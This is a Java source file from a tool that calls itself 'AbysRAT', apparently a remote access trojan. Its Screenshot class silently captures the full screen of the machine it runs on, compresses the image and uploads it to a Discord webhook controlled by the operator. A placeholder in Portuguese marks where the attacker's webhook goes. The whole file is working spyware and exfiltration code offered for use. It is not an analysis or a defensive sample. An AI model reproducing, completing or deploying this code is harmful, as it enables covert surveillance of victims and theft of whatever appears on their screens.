package dev.nfo.handlers;

import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Screenshot {
    private final String webhookUrl;

    public Screenshot(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    public byte[] takeScreenshot() throws IOException, AWTException {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        BufferedImage screenshot = new Robot().createScreenCapture(screenRectangle);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageWriter writer = ImageIO.getImageWritersByFormatName("jpeg").next();
        ImageWriteParam param = writer.getDefaultWriteParam();

        if (param.canWriteCompressed()) {
            param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
            param.setCompressionQuality(0.3f);
        }

        ImageOutputStream ios = ImageIO.createImageOutputStream(baos);
        writer.setOutput(ios);
        writer.write(null, new javax.imageio.IIOImage(screenshot, null, null), param);
        
        writer.dispose();
        ios.close();
        
        byte[] imageBytes = baos.toByteArray();
        baos.close();

        return imageBytes;
    }

    public void sendToDiscord(byte[] imageBytes) throws IOException {
        if (webhookUrl == null || webhookUrl.equals("SEU_WEBHOOK_URL_AQUI")) {
            return;
        }

        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        URL url = new URL(webhookUrl);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        connection.setRequestProperty("User-Agent", "AbysRAT/1.0");
        connection.setDoOutput(true);
        connection.setDoInput(true);

        try (OutputStream outputStream = connection.getOutputStream()) {
            // Username field
            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"username\"\r\n\r\n".getBytes("UTF-8"));
            outputStream.write("AbysRAT\r\n".getBytes("UTF-8"));

            // Avatar URL field
            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"avatar_url\"\r\n\r\n".getBytes("UTF-8"));
            outputStream.write("https://i.imgur.com/ovwcNwY.png\r\n".getBytes("UTF-8"));

            // File field
            outputStream.write(("--" + boundary + "\r\n").getBytes("UTF-8"));
            outputStream.write("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.jpg\"\r\n".getBytes("UTF-8"));
            outputStream.write("Content-Type: image/jpeg\r\n\r\n".getBytes("UTF-8"));
            outputStream.write(imageBytes);
            outputStream.write("\r\n".getBytes("UTF-8"));

            // End boundary
            outputStream.write(("--" + boundary + "--\r\n").getBytes("UTF-8"));
            outputStream.flush();
        }

        connection.getResponseCode();
        connection.disconnect();
    }

    public void captureAndSend() {
        try {
            byte[] imageBytes = takeScreenshot();
            sendToDiscord(imageBytes);
        } catch (IOException | AWTException e) {
            e.printStackTrace();
        }
    }
}
